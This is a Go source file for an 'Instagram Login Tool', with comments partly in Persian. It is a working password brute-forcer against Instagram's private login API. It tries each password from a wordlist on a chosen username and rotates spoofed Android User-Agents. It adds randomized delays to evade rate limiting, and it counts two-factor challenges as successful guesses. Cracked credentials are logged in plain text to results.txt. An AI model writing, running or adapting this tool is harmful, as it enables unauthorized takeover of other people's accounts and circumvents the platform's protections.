package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

// 20 ta User-Agent mokhtalef baraye estefade dar request ha
var userAgents = []string{
	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
	"Instagram 121.0.0.29.119 Android (28/9; 480dpi; 1080x1920; Xiaomi; Redmi Note 7; lavender; qcom; en_US; 168361112)",
	"Instagram 100.0.0.17.129 Android (25/7.1.2; 320dpi; 720x1280; samsung; SM-J510FN; j5xnlte; qcom; en_US; 153788171)",
	"Instagram 150.0.0.33.120 Android (29/10; 420dpi; 1080x2094; HUAWEI; VOG-L29; HWVOG; kirin980; en_US; 185412300)",
	"Instagram 123.0.0.21.114 Android (27/8.1.0; 380dpi; 1080x2160; Google; Pixel 2; walleye; sdm835; en_US; 167925111)",
	"Instagram 110.0.0.16.119 Android (26/8.0.0; 400dpi; 1080x1920; LG; LG-H870; lucye; msm8996; en_US; 158726439)",
	"Instagram 140.0.0.34.123 Android (30/11; 560dpi; 1440x3200; samsung; SM-G998B; p3s; exynos2100; en_US; 192383011)",
	"Instagram 120.0.0.24.128 Android (23/6.0; 320dpi; 720x1280; Sony; G3311; pine; mt6737m; en_US; 165892220)",
	"Instagram 81.0.0.18.101 Android (28/9; 480dpi; 1080x1920; OnePlus; ONEPLUS A6013; OnePlus6T; qcom; en_US; 143110002)",
	"Instagram 160.0.0.30.119 Android (31/12; 440dpi; 1080x2400; Xiaomi; M2007J3SG; apollo; sm8250; en_US; 200001001)",
	"Instagram 134.0.0.25.121 Android (29/10; 560dpi; 1440x3040; samsung; SM-N960F; crownlte; exynos9810; en_US; 179900210)",
	"Instagram 90.0.0.18.119 Android (26/8.0.0; 480dpi; 1440x2560; LG; LG-H870DS; lucye_global_com; msm8996; en_US; 148510002)",
	"Instagram 170.0.0.30.474 Android (32/12L; 560dpi; 1440x3120; HUAWEI; ELS-NX9; HWELE; kirin990; en_US; 209100100)",
	"Instagram 99.0.0.32.182 Android (25/7.1.1; 320dpi; 720x1280; samsung; SM-G532F; grandpplte; mt6737t; en_US; 152009271)",
	"Instagram 180.0.0.30.119 Android (33/13; 440dpi; 1080x2400; Google; Pixel 6; oriole; gs101; en_US; 210012300)",
	"Instagram 166.0.0.30.119 Android (30/11; 560dpi; 1440x3200; samsung; SM-G996B; p2s; exynos2100; en_US; 201112201)",
	"Instagram 150.0.0.33.120 Android (29/10; 420dpi; 1080x2094; HUAWEI; VOG-L09; HWVOG; kirin980; en_US; 185412301)",
	"Instagram 105.0.0.18.119 Android (27/8.1.0; 400dpi; 1080x1920; Xiaomi; Redmi Note 5; whyred; sdm636; en_US; 155382300)",
	"Instagram 103.0.0.20.123 Android (23/6.0; 320dpi; 720x1280; Motorola; Moto G (5S); montana; msm8937; en_US; 154201109)",
	"Instagram 144.0.0.32.138 Android (28/9; 480dpi; 1080x2160; OnePlus; ONEPLUS A6003; OnePlus6; qcom; en_US; 183320002)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))

		success, response := tryLogin(username, password)

		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			saveResult(username, password, true)
			return
		} else {
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}

		// افزایش فاصله زمانی بین درخواست‌ها
		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	// User-Agent random az list entekhab mishavad
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	success := response.Status == "ok" ||
		strings.Contains(string(body), "logged_in_user")

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}

	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
		currentTime, status, username, password)

	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
